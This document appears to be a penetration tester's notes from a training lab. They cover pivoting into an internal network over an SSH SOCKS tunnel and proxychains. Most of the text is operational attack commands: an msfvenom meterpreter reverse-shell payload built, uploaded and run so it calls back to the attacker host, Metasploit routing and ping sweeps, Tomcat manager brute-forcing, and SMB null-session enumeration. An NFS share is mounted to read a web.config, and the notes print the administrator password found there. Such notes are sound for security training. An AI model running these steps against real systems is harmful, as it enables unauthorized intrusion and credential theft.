## Setting Up Pivoting - SSH

```
ssh -D 8081 -i id_rsa root@10.129.223.143
```

**Confirm ssh data is going to port 8081 on attack host
```
netstat -antp | grep 8081
```

**Modify /etc/proxychains.conf
```
sudo nano /etc/proxychains.conf

socks4 127.0.0.1 8081
```

**Scan open port on second NIC
```
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

```
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```


## Setting Up Pivoting - Metasploit

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
```

**Transfer shell file through ssh to target
```
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

**Setup listener
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.14.15
set LPORT 443
exploit
```

**Execute shell on target
```
chmod +x shell.elf
./shell.elf
```

**Setup routes
```
background
use post/multi/manage/autoroute
show options
set SESSION 1
set subnet 172.16.8.0
run
```


## Host Discovery - 172.16.8.0/23 Subnet - Metasploit

```
use post/multi/gather/ping_sweep
show options
set rhosts 172.16.8.0/23
set SESSION 1
run
```


## Host Enumeration

```
./nmap --open -iL live_hosts
```
- Transfer nmap binary to dmz01 host
- nmap binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
- 172.16.8.3 is a Domain Controller because we see Kerberos and LDAP
- 172.16.8.20 is a Windows host with 80 and 2049 (NFS) open
- 172.16.8.50 is a Windows host with port 8080 sticking out.



## Active Directory Quick Hits - SMB NULL SESSION

- We should check for SMB NULL sessions to get password policy and user list, to perform a measured password spraying attack
- We can also use kerbrute to enumerate valid usernames from various user lists (including scraping LinkedIn usernames)
- We can also try ASREPRoasting attack if we have valid usernames

```
proxychains enum4linux -U -P 172.16.8.3
```


## 172.16.8.50 - Tomcat

- 8080 was open, and this is tomcat. We can try bruteforcing
- If we do not have routing set up in msfconsole, we just need to type
```
proxychains msfconsole
set rhosts 172.16.8.50
set stop_on_success true
run
```
- If manager is exposed to the internet, this is a finding, but if it is open internally, this is normal
- It is a finding if the manager portal has weak credentials and we can upload a JSP web shell


## Enumerating 172.16.8.20 - DotNetNuke (DNN)

```
proxychains curl http://172.16.8.20
```
- DNN is like wordpress of .NET

Set up SOCKS proxy and browse to it.
```url
about:preferences#searchResults

SOCKS v5 127.0.0.1 port 8081
```

Browse to admin page
```
http://172.16.8.20/Login?returnurl=%2fadmin
```

**NFS
```
cd /tmp
proxychains showmount -e 172.16.8.20
mkdir DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cd DEV01/
ls
cd DNN
ls
cat web.config
```
- Administrator:D0tn31Nuk3R0ck$$@123 (DNN creds)

**Might as well use tcpdump since we have root on dmz01
```
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

